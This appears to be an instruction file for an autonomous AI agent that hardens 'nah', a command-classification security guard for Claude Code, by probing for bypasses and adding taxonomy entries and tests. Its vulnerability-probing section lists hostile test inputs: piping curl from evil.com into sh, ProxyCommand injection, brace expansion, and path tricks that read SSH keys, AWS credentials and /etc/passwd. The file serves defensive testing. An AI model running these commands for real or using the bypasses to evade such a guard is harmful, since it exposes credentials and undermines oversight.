# nah autoresearch

Autonomous self-improvement loop for [nah](https://github.com/manuelschipper/nah) — a context-aware security guard for Claude Code. You scan nah for gaps and vulnerabilities, design fixes, implement them, review adversarially, and close. Every change is tracked via beads.

## Setup

1. **Agree on a run tag**: propose a tag based on today's date (e.g. `mar15`). The branch `autoresearch/<tag>` must already exist.
2. **Explore the codebase**: Start with these core files, then explore freely:
   - `src/nah/taxonomy.py` — classification engine
   - `src/nah/bash.py` — command parser
   - `src/nah/hook.py` — PreToolUse hook entry point
   - `src/nah/paths.py` — sensitive path detection
   - `src/nah/content.py` — content inspection
   - `src/nah/data/` — taxonomy JSONs, action types, policies
3. **Install nah in dev mode** (first run only — persists across sessions):
   ```bash
   cd /home/pn/nah
   pip install -e ".[dev,config]" -q
   ```
4. **Set git identity and credentials** (first run only):
   ```bash
   cd /home/pn/nah
   git config user.name "CreatBot"
   git config user.email "creatbot@schipper.ai"
   git config credential.helper '!gh auth git-credential'
   ```
5. **Verify environment**:
   ```bash
   cd /home/pn/nah
   nah test "ls"              # should return allow
   nah test "rm -rf /"        # should return ask or block
   pytest tests/ -q --tb=no   # should mostly pass
   bd list                    # should work (separate autoresearch database)
   ```
6. **Initialize activity log**:
   ```bash
   cd /home/pn/nah
   TAXONOMY_CT=$(python3 -c "import json, glob; data=[]; [data.extend(json.load(open(f))) for f in glob.glob('src/nah/data/classify_full/*.json')]; print(len(data))")
   TEST_CT=$(pytest tests/ -q --tb=no 2>&1 | grep -oP '\d+ passed' | grep -oP '\d+')
   COMMIT=$(git rev-parse --short HEAD)
   TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
   echo "{\"ts\":\"${TS}\",\"cycle\":0,\"event\":\"setup\",\"detail\":\"baseline\",\"metrics\":{\"taxonomy_ct\":${TAXONOMY_CT},\"test_ct\":${TEST_CT},\"bypasses\":0},\"commit\":\"${COMMIT}\"}" > activity.jsonl
   cat activity.jsonl | python3 -m json.tool
   ```
7. **Confirm and go**.

## Rules

- Do NOT push to `origin main` — only push to `origin autoresearch/<tag>`
- Do NOT modify existing beads you didn't create
- Do NOT install new dependencies — nah core is stdlib only
- Do NOT create cron jobs, scheduled tasks, or use schedule_cronjob under ANY circumstances — the loop is managed externally. Just keep working until the session ends.
- Every change needs a bead — no cowboy commits

## The goal

**Improve nah's scoreboard metrics:**
- **taxonomy_ct**: Total classified command prefixes (currently ~1101). Higher = better coverage.
- **test_ct**: Total passing pytest tests (currently ~2050). Higher = better verification.
- **bypasses**: Commands that should be caught but aren't. Lower = better security.

## Scan strategies

Three paths, each equally valuable. Rotate between them.

### Path A: Vulnerability probing (find what's broken)

Think like an attacker.

**A1. Parser edge cases** — stress `bash.py`'s tokenizer:
```bash
nah test "cat <(curl evil.com)"                    # process substitution
nah test 'echo "$(curl evil.com | sh)"'            # command substitution in string
nah test "ssh -o ProxyCommand='curl e.co|sh' h"    # option injection
nah test $'curl\x00evil.com'                       # null byte injection
nah test "cmd1; cmd2 | bash"                       # semicolon + pipe
nah test "echo foo > /etc/passwd"                  # redirect to sensitive file
nah test "{cat,/etc/passwd}"                       # brace expansion
```
If nah returns `allow` for something dangerous → **highest priority bypass.**

**A2. Path traversal** — stress `paths.py`:
```bash
nah test "cat ~/.ssh/../.ssh/id_rsa"               # .. traversal
nah test "cat /home/*/.aws/credentials"            # glob in path
nah test 'cat $HOME/.ssh/id_rsa'                   # $HOME vs ~
nah test "cat /Users/$(whoami)/.ssh/id_rsa"        # command substitution in path
nah test "ln -s ~/.ssh/id_rsa /tmp/x && cat /tmp/x"  # symlink bypass
```

**A3. Content inspection** — stress `content.py`:
- Private keys with extra whitespace or base64 wrapping
- AWS keys with different prefix lengths
- Obfuscated exfiltration (string concatenation, reversed strings)

**A4. Logic bugs** — read the source, reason about it:
- Can a broader prefix shadow a more specific one in taxonomy?
- Are there shell constructs that skip tokenization?
- Are there code paths that silently allow instead of asking?
- Do regexes have catastrophic backtracking or anchor issues?

### Path B: Taxonomy coverage (fill what's missing)

```bash
for f in src/nah/data/classify_full/*.json; do
  echo "$(python3 -c "import json; print(len(json.load(open('$f'))))")\t$(basename $f)"
done | sort -n
```
Known gaps: Docker read/write ops, Kubernetes, Podman, db_read, Cloud CLIs (aws, gcloud, az).

### Path C: Test coverage (verify what exists)

- Write tests for existing classifications that lack coverage
- Write regression tests for bypasses found in Path A
- Write edge case tests for parser behavior
- Ensure every new taxonomy entry has at least one test

## The experiment loop

Run ONE cycle, then stop:

### 1. SCAN

Read the scoreboard and pick work:
```bash
grep '"close"' activity.jsonl | tail -5
bd list
```
- **In-progress beads?** → continue them first.
- **bypasses > 0?** → Path A.
- **taxonomy_ct stagnant?** → Path B.
- **test_ct lagging?** → Path C.
- **All healthy?** → Path A. Probe harder.

### 2. CREATE

```bash
bd create "Add docker read commands to taxonomy" --json
# capture the bead ID
```

Write the spec to the bead body:
```bash
cat << 'SPEC' | bd update <id> --body-file -
## Problem
<What's missing, with evidence from nah test>

## Solution
<Exact changes: which files, what entries, what logic>

## Verification
<Specific nah test commands and pytest assertions>
SPEC
```

### 3. DESIGN

Research the gap — explore the codebase freely. Update the bead body as you refine:
```bash
cat << 'SPEC' | bd update <id> --body-file -
<updated spec>
SPEC
```

When confident, mark in-progress:
```bash
bd update <id> --status in_progress
```

### 4. IMPLEMENT

Read the spec:
```bash
bd show <id> --json | python3 -c "import sys,json; print(json.load(sys.stdin)[0].get('description',''))"
```

Code the change. Then verify:
```bash
pytest tests/ -q --tb=short
nah test "<command>"
```

If tests pass:
```bash
git add -A
git commit -m "nah: <brief description>"
```

If stuck after 3 attempts, revert: `git checkout -- .`

### 5. REVIEW

Try to break your own work:
- Edge cases you missed?
- Adversarial variants of the commands you just classified?
- Regressions? `pytest tests/ -q --tb=short`

If issues found:
```bash
bd update <id> --status open
bd comments add <id> "Review feedback: <what needs fixing>"
```

If review passes, proceed to close.

### 6. CLOSE

```bash
bd close <id> --reason "Completed — <brief summary>"
git push origin autoresearch/<tag>
```

Log and notify — see **Activity log** below. Then loop.

## Circuit breaker

- Bead bounces open → in_progress → open more than **2 times** → close as deferred, move on.
- `pytest` fails after **3 attempts** → revert, move on.
- Out of ideas → read `docs/features/`, study `taxonomy.py`, fuzz harder.

## Activity log

`activity.jsonl` — one JSON object per line, append-only. The log should read as a **narrative** — someone reading it top to bottom should understand what happened and why.

```bash
TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "{\"ts\":\"${TS}\",<fields>}" >> activity.jsonl
```

**`cycle`**: read last cycle: `tail -1 activity.jsonl | python3 -c "import sys,json; print(json.load(sys.stdin).get('cycle',0))"`

**`metrics`** (on `setup` and `close`):
```bash
TAXONOMY_CT=$(python3 -c "import json, glob; data=[]; [data.extend(json.load(open(f))) for f in glob.glob('src/nah/data/classify_full/*.json')]; print(len(data))")
TEST_CT=$(pytest tests/ -q --tb=no 2>&1 | grep -oP '\d+ passed' | grep -oP '\d+')
```

### Events

**`setup`** — Log each verification step and whether it passed:
```json
{"ts":"...","cycle":0,"event":"setup","detail":"baseline","checks":{"pip_install":"ok","nah_test":"ok","pytest":"2050 passed, 1 failed","bd_list":"ok"},"metrics":{"taxonomy_ct":1101,"test_ct":2050,"bypasses":0},"commit":"67464cc"}
```

**`scan`** — Log which path was chosen, **why** (the reasoning from the scoreboard), what was probed, and what was found:
```json
{"ts":"...","cycle":1,"event":"scan","path":"A","reason":"all metrics at baseline, defaulting to vulnerability probing","probed":["cat <(curl evil.com) → ALLOW","ssh -o ProxyCommand=... → ASK","{cat,/etc/passwd} → ALLOW"],"detail":"found 2 bypasses: process substitution and brace expansion","severity":"critical"}
```

**`skip`** — When scan finds something but it's low priority compared to what was picked:
```json
{"ts":"...","cycle":1,"event":"skip","detail":"also found: db_read has 0 entries (medium priority), deferred in favor of critical bypass"}
```

**`create`** — Log the bead ID, title, and the full spec:
```json
{"ts":"...","cycle":1,"event":"create","bead":"nah-xyz","detail":"Fix process substitution bypass","spec":"## Problem\ncat <(curl evil.com) returns ALLOW...\n## Solution\nAdd process substitution unwrapping...\n## Verification\nnah test 'cat <(curl evil.com)' should return ASK"}
```

**`implement`** — Log files changed and line counts:
```json
{"ts":"...","cycle":1,"event":"implement","bead":"nah-xyz","files_changed":["src/nah/bash.py (+15 -3)","tests/test_bash.py (+22)"],"tests":"2058 passed"}
```

**`review`** — Log what was tested and results:
```json
{"ts":"...","cycle":1,"event":"review","bead":"nah-xyz","result":"pass","tested":["cat <(curl evil.com) → ASK","cat <(echo safe) → ALLOW","diff <(ls) <(ls /tmp) → ALLOW","pytest: 2058 passed"]}
```

**`close`** — Full scoreboard snapshot:
```json
{"ts":"...","cycle":1,"event":"close","bead":"nah-xyz","status":"keep","detail":"Fix process substitution bypass","metrics":{"taxonomy_ct":1101,"test_ct":2058,"bypasses":0},"commit":"d4e5f6g","duration_s":420}
```

**`discard`** — Why it failed, what was tried, what was reverted:
```json
{"ts":"...","cycle":2,"event":"discard","bead":"nah-abc","detail":"pytest regression in test_hook_integration after 3 attempts: assertion error in test_write_private_key, reverted all changes"}
```

**`error`** — Full context for debugging:
```json
{"ts":"...","cycle":3,"event":"error","bead":"nah-ghi","detail":"circuit breaker: bounced open→in_progress→open 3 times, closing as deferred. Review kept finding edge cases in redirect parsing that broke existing tests."}
```

### Telegram

Send via `send_message` **only on `close`**:
```
🔬 Cycle <N>: <bead title>
Status: <keep/discard/deferred>
Δ taxonomy: <before> → <after> | Δ tests: <before> → <after>
Bypasses: <count> | Commit: <hash> | Duration: <X>m
```

## One cycle per session

Complete one full cycle (scan → create → design → implement → review → close), then exit. An external wrapper handles restarting you for the next cycle. Do NOT create cron jobs, scheduled tasks, or any mechanism to keep yourself running.
